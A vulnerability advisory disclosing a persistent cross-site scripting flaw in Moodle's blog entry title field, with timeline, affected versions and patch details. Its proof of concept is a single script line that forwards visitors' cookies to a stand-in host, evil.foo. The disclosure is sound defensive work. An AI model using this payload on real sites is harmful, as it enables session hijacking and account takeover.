PR08-13: Persistent Cross-site Scripting (XSS) on Moodle via blog entry
title

Vulnerability found: 20/06/2008

Vendor informed: 25/06/2008

Vulnerability fixed: 16/07/2008

Advisory publicly released: 22/07/2008

Severity: High

Description:

By creating a new blog entry ('/blog/edit.php') with a malicious entry
title ('etitle' parameter), it is possible to inject unrestricted
JavaScript and HTML *persistently* into the application. The malicious
code would be returned (and executed) on the main blog section of the
site ('/blog/') which can be viewed by any type of account (i.e.: guest,
student, teacher, administrator, etc).


Notes:

- - Prerequisite for successful exploitation is blogs being enabled and
attacker's account having capabilities to add new entries.

- - Moodle reveals its version within HTML source code. i.e.: <a
title="moodle 1.6.5 + (2006050550)" href="http://moodle.org/">

Proof of concept:

Example of malicious code to be injected as a new blog entry title. Such
code forwards the cookies of any users who access the blog section of
the site to a third-party website:

<script>location='http://evil.foo/x.php?'+document.cookie</script>

The proof of concept was tested on the following environment:

Server: Apache/2.2.2 (Unix) PHP/5.2.1 mod_ssl/2.2.2 OpenSSL/0.9.7l
Moodle 1.6.5 + (2006050550)

Consequences:

It is possible to hijack any account (including privileged ones) by
stealing the victim's session ID (stored in cookies), or inject a spoof
HTML login form for phishing purposes. Other attacks are also possible.

Versions affected as confirmed by the vendor:

1.7.3, 1.7.4, 1.6.5, 1.7.2, 1.7.1, 1.7, 1.6.6, 1.6.4, 1.6.3, 1.6.2,
1.6.1, 1.6

Fix:

Upgrade to 1.6.7, 1.7.5 or any recent nightly or use patch
http://cvs.moodle.org/moodle/blog/lib.php?r1=1.38.6.3&r2=1.38.6.2

This issue has been tracked as MDL-15392.
